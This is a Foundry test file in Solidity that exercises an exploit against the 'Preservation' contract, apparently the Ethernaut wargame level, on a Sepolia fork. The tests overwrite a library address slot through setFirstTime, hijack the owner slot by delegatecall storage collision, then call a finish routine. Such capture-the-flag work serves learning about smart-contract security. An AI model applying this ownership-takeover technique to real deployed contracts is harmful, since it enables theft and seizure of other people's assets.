// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";
import {Preservation} from "../src/Preservation.sol";
import {AttackPreservation} from "../src/AttackPreservation.sol";

contract AttackPreservationTest is Test {
    using stdStorage for StdStorage;

    Preservation public preservation;
    AttackPreservation public attackPreservation;

    // Create test addresses
    address ownerAttacker = makeAddr("ownerAttacker");

    string SEPOLIA_RPC_URL = vm.envString("SEPOLIA_RPC_URL");
    address preservationAddress = vm.envAddress("SEPOLIA_PRESERVATION_CONTRACT");

    function setUp() public {
        vm.createSelectFork(SEPOLIA_RPC_URL);
        preservation = Preservation(preservationAddress);
        vm.prank(ownerAttacker);
        attackPreservation = new AttackPreservation();
    }

    function test_phase_one_replace_library_address() public {
        console.log(
            "[storage] timeZone1Library: %s",
            stdstore.target(address(preservation)).sig(preservation.timeZone1Library.selector).read_address()
        );
        console.log(
            "[storage] timeZone2Library: %s",
            stdstore.target(address(preservation)).sig(preservation.timeZone2Library.selector).read_address()
        );
        console.log(
            "[storage] owner: %s",
            stdstore.target(address(preservation)).sig(preservation.owner.selector).read_address()
        );

        preservation.setFirstTime(uint256(uint160(address(attackPreservation))));

        assertEq(
            stdstore.target(address(preservation)).sig(preservation.timeZone1Library.selector).read_address(),
            address(attackPreservation)
        );
    }

    function test_phase_two_attack_owner_slot() public {
        preservation.setFirstTime(uint256(uint160(address(attackPreservation))));

        preservation.setFirstTime(uint256(uint160(ownerAttacker)));

        assertEq(stdstore.target(address(preservation)).sig(preservation.owner.selector).read_address(), ownerAttacker);
    }

    function test_selfdestruct_works() public {
        preservation.setFirstTime(uint256(uint160(address(attackPreservation))));
        preservation.setFirstTime(uint256(uint160(ownerAttacker)));

        vm.prank(ownerAttacker);
        attackPreservation.finish();
    }
}
